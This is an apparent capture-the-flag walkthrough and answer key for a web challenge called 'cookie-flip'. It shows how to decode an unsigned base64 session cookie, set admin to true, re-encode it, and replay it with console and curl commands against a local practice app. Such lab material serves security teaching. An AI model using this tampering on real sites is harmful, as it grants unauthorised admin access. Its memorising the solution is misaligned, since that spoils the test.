# 4 — Zero Cool's cookie

- **Slug:** `cookie-flip`
- **Category:** Web · **Points:** 20
- **Surface:** `zero.example.com` (or `/c/4` from hub)
- **GIBSON key part:** —

## Premise

A vintage 1995-style session cookie stores `{user:'guest',admin:false}` base64-encoded. The page denies access while `admin=false`. Flip the bool, re-encode, reload.

## What you need

- Browser DevTools (Application tab → Cookies).
- Base64 encoder/decoder (`btoa`/`atob` in console works).

## Step-by-step solve

1. Visit `http://localhost:3000/c/4`. First visit drops a cookie named `session`, value `eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9`.
2. Page shows:
   ```
   user:  guest
   admin: false

     access denied.
     guests don't get to see the cinema. how dull.
   ```
3. DevTools → Application tab → Cookies → `http://localhost:3000`. Find row `session`. Copy the value.
4. Decode in console:
   ```js
   JSON.parse(atob("eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9"))
   // => { user: 'guest', admin: false }
   ```
5. Flip and re-encode:
   ```js
   btoa(JSON.stringify({ user: 'guest', admin: true }))
   // => "eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0="
   ```
6. Back in DevTools Cookies, edit the `session` row's Value to that new string.
7. Reload `http://localhost:3000/c/4`.
8. Page now shows:
   ```
   user:  guest
   admin: true

     ACCESS GRANTED.
     the projector hums to life.
     ZERODAY{...}
   ```

### curl alternative

```bash
ENC=$(printf '%s' '{"user":"guest","admin":true}' | base64)
curl -b "PLAYER_COOKIE=<your-cookie>; session=$ENC" http://localhost:3000/c/4
```

## Submit

```bash
curl -X POST http://localhost:3000/api/submit \
  -H 'Content-Type: application/json' \
  -b "PLAYER_COOKIE=<your-cookie>" \
  -d '{"challenge_id":"cookie-flip","flag":"ZERODAY{...}"}'
```

## Common failure modes

- **Confusing `session` with `PLAYER_COOKIE`** — `session` is the puzzle's own cookie scoped to challenge #4. Don't touch `PLAYER_COOKIE`.
- **Trailing `=` padding stripped** — base64 in cookies usually keeps the `=`. If your edited value lost it, add it back.
- **Editing the JSON without re-encoding** — the server reads `atob(cookie)` then `JSON.parse`. Skip either step and it falls back to `admin=false`.

## Verification (admin side)

`solve` event. Drawer shows `current_ordinal=5`.
